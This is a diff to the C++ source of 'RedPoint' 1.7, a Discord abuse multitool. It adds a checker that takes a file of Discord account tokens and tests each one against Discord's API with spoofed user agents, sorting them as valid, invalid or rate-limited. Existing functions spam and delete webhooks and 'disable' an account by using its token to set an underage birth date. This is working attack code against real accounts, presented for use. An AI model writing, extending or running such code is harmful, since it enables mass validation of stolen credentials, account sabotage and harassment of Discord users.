@@ -16,6 +16,7 @@
 #endif
 using namespace std;
 using json = nlohmann::json;
+using namespace cpr;
 
 /* globals yea */
 string BLACK = "\x1b[1;30m";
@@ -29,41 +30,6 @@ string WHITE = "\x1b[1;37m";
 string RESET = "\x1b[1;0m";
 string REDPOINT_VERSION = "1.7";
 
-
-void check_for_updates() {
-
-    DWORD dwMode;
-    HANDLE hOutput = GetStdHandle(STD_OUTPUT_HANDLE);
-    GetConsoleMode(hOutput, &dwMode);
-    dwMode |= ENABLE_PROCESSED_OUTPUT | ENABLE_VIRTUAL_TERMINAL_PROCESSING;
-    SetConsoleMode(hOutput, dwMode);
-
-    cpr::Response ver = cpr::Get(cpr::Url{"https://raw.githubusercontent.com/13-05/redpoint/main/etc/VERSION.txt"});
-
-    string version = ver.text;
-    string new_version;
-
-    if (!version.empty() && version[version.length() - 1] == '\n') {
-        new_version = version.erase(version.length() - 1);
-    }
-    else {
-        version.erase(std::remove(version.begin(), version.end(), '\n'), version.end());
-        new_version = version;
-    }
-
-    if (new_version.find(REDPOINT_VERSION) == string::npos && new_version.find("404") == string::npos) {
-        string ex;
-        cout << RED << "A new RedPoint version is available!" << endl;
-        cout << BLUE << "Download it here: https://github.com/13-05/redpoint/blob/main/redpoint/VERSION_" << new_version << ".txt" << endl;
-        cout << MAGENTA << "Press ENTER to close the program..." << endl;
-        getline(cin, ex);
-        exit(0);
-    }
-    else {
-        cout << RED << "RedPoint is up to date!" << endl;
-        Sleep(5000);
-    }
-}
 
 void clearscr() {
 #ifdef _WIN32 // Includes both 32 bit and 64 bit
@@ -81,27 +47,23 @@ void help() {
 
 
     cout << MAGENTA << "3)" << BLUE << " spam webhook " << BLUE << " | " << GREEN << " spams a discord webhook" << endl;
-    cout << MAGENTA << "4)" << BLUE << " delete webhook " << BLUE << " | " << GREEN << " deletes a provided discord webhook" << endl;
-    cout << MAGENTA << "5)" << BLUE << " userid lookup " << BLUE << " | " << GREEN << " gets info on a discord user by their id" << endl;
-    cout << MAGENTA << "6)" << BLUE << " disable token " << BLUE << " | " << GREEN << " disables the account associated with a provided token " << endl;
+    cout << MAGENTA << "4)" << BLUE << " delete webhook " << BLUE << " | " << GREEN << " deletes a discord webhook" << endl;
+    cout << MAGENTA << "5)" << BLUE << " userid lookup " << BLUE << " | " << GREEN << " gets info on a discord userid" << endl;
+    cout << MAGENTA << "6)" << BLUE << " disable token " << BLUE << " | " << GREEN << " deletes a discord account by token" << endl;
+    cout << MAGENTA << "7)" << BLUE << " token checker " << BLUE << " | " << GREEN << " looks for working tokens in a file" << endl;
 
-    cout << MAGENTA << "7)" << RED << " clone webpage " << BLUE << " | " << GREEN << " gets the source code of a specified html webpage; command-line \"view source\"" << endl;
-    cout << MAGENTA << "8)" << RED << " ip lookup " << BLUE << " | " << GREEN << " gets information about the specified Ipv4 address" << endl;
-    cout << MAGENTA << "9)" << RED << " image search " << BLUE << " | " << GREEN << " uses the yandex image search api to find similar images to the inputted url" << endl;
+    cout << MAGENTA << "8)" << RED << " clone webpage " << BLUE << " | " << GREEN << " command-line \"view source\"" << endl;
+    cout << MAGENTA << "9)" << RED << " ip lookup " << BLUE << " | " << GREEN << " gets information for an Ipv4 address" << endl;
+    cout << MAGENTA << "10)" << RED << " image search " << BLUE << " | " << GREEN << " finds similar images based on a url";
 
     cout << "\n\n";
 }
 
 void welcome() {
     const char* welcomestr =
-        "  ______ _______ ______   _____   _____  _____ __   _ _______\n"
-        " |_____/ |______ |     \\ |_____] |     |   |   | \\  |    |   \n"
-        " |    \\_ |______ |_____/ |       |_____| __|__ |  \\_|    |   ";
-    DWORD dwMode;
-    HANDLE hOutput = GetStdHandle(STD_OUTPUT_HANDLE);
-    GetConsoleMode(hOutput, &dwMode);
-    dwMode |= ENABLE_PROCESSED_OUTPUT | ENABLE_VIRTUAL_TERMINAL_PROCESSING;
-    SetConsoleMode(hOutput, dwMode);
+        " \n"
+        " R   E   D   P   O   I   N   T\n"
+        " ";
     clearscr();
     cout << RED << welcomestr << MAGENTA << "\n\n[run \"help\" for a list of commands.]" << RED;
     cout << "\n\n\n";
@@ -130,27 +92,27 @@ void userid_lookup(string USERID) {
     string bot_bool = to_string(id["user"]["bot"]);
 
     string unixtimestr = to_string(id["user"]["createdTimestamp"]);
-    
 
-    cout << "username: " << uname << endl << "discrim: " << discrim << endl << "bot?: " << bot_bool << endl << "(unix) creation date: " << unixtimestr << endl;
+
+    cout << BLUE << "username: " << uname << endl << "discrim: " << discrim << endl << "bot?: " << bot_bool << endl << "(unix) creation date: " << unixtimestr << endl;
 }
 
 void disable_token(string token) {
     cout << BLUE << "attempting to disable token " << token << RESET << endl;
     cpr::Response r = cpr::Patch(cpr::Url{ "https://discord.com/api/v9/users/@me" },
-        cpr::Header{ {"user-agent", "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"}},
+        cpr::Header{ {"user-agent", "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"} },
         cpr::Payload{ {"date_of_birth", "2022-1-1"} });
 }
 
 void clone_page(string exac_page_url) {
     cpr::Response r = cpr::Get(cpr::Url{ exac_page_url },
-        cpr::Header{ {"user-agent", "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"}});
+        cpr::Header{ {"user-agent", "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"} });
     if (r.status_code != 200) {
         cout << YELLOW << "there was an error cloning the page." << endl;
     }
     else {
         cpr::Response paste = cpr::Post(cpr::Url{ "https://pastie.io/documents" },
-            cpr::Header{ {"content-type", "text/plain"}},
+            cpr::Header{ {"content-type", "text/plain"} },
             cpr::Body{ {r.text} });
 
         json pastie_response = json::parse(paste.text);
@@ -170,20 +132,40 @@ void lookup_ip(string ip) {
 
 void delete_webhook(string HOOK) {
     cpr::Response r = cpr::Delete(cpr::Url{ HOOK });
-    cout << YELLOW << "attempted to delete the webhook." << RESET << endl;
+    cout << BLUE << "attempted to delete the webhook." << RESET << endl;
 }
 
-void yand_image_search(string url) {
-    cpr::Response r = cpr::Get(cpr::Url{"https://n.mnfd.link/new"},
-        cpr::Header{ {"host", "n.mnfd.link"}},
-        cpr::Header{ {"user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0"}});
-    cout << r.status_code << endl;
-    json shortened_res_url = json::parse(r.text);
-    cout << RED << "find image search results at " << GREEN << "https://n.mnfd.link/" << shortened_res_url["id"] << endl;
+void yand_image_search(string ImgURL) {
+    cout << BLUE << "find similar images at https://yandex.com/images/search?source=collections&&url=" << ImgURL << "&rpt=imageview" << endl;
 }
+
+string check_token_validity(string token) {
+    string url = "https://discord.com/api/v9/users/@me";
+    Response r =
+        Get(Url{ url },
+            Header{ {"Content-Type", "application/json"} },
+            Header{ {"User-Agent", "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"} },
+            Header{ {"Authorization", token} });
+    if (r.status_code == 200) {
+        string returnval = token + GREEN + " VALID " + to_string(r.status_code) + "\n";
+        return returnval;
+    }
+    else if (r.status_code == 401) {
+        string returnval = token + RED + " INVALID " + to_string(r.status_code) + "\n";
+        return returnval;
+    }
+    else if (r.status_code == 429) {
+        string returnval = token + YELLOW + " RATELIMITED " + to_string(r.status_code) + "\n";
+        return returnval;
+    }
+    else {
+        return token + CYAN + " ERROR " + to_string(r.status_code) + "\n";
+    }
+}
+
 
 void interpret(string inter) {
-    /* thanks https://stackoverflow.com/a/2340309/17055513 :> for da string::npos and str.find ykyk */
+    /* thanks https://stackoverflow.com/a/2340309/17055513 :> */
     if (inter.find("help") != string::npos) {
         help();
     }
@@ -277,23 +259,46 @@ void interpret(string inter) {
         lookup_ip(IP);
     }
     else if (inter.find("image search") != string::npos) {
-        /* globals jej */
-        string URL;
-        string URLTOSEARCH;
+        /* globals ez */
+        string IMG_URL;
 
-        /* user input */
-        cout << RED << "input image url to reverse search: " << RESET;
-        getline(cin, URL);
+        /* ez user input */
+        cout << RED << "image url: " << RESET;
+        getline(cin, IMG_URL);
 
-        URLTOSEARCH = "https://yandex.com/images/search?source=collections&&url=" + URL + "&rpt=imageview";
+        /* searching it */
+        yand_image_search(IMG_URL);
+    }
+    else if (inter.find("token checker") != string::npos) {
+        /* globals :AYAYA: */
+        string inputtedtokenfile;
+        string line;
+        ifstream tokenfile;
 
-        yand_image_search(URLTOSEARCH);
+        /* user input momen */
+        cout << RED << "file containing token list: " << RESET;
+        getline(cin, inputtedtokenfile);
+
+        /* checking input validity */
+        if (inputtedtokenfile.find(".txt") == string::npos) {
+            inputtedtokenfile = inputtedtokenfile + ".txt";
+        }
+        cout << RED << "reading from file \"" << inputtedtokenfile << "\"" << endl;
+        tokenfile.open(inputtedtokenfile);
+
+        if (!tokenfile.is_open()) {
+            cout << YELLOW << "there was an error opening " << inputtedtokenfile << endl;
+        }
+        else {
+            while (getline(tokenfile, line)) {
+                cout << check_token_validity(line);
+            }
+        }
     }
 }
 
 int main()
 {
-    check_for_updates();
 
     /* GLOBALS */
     int constant = 1;
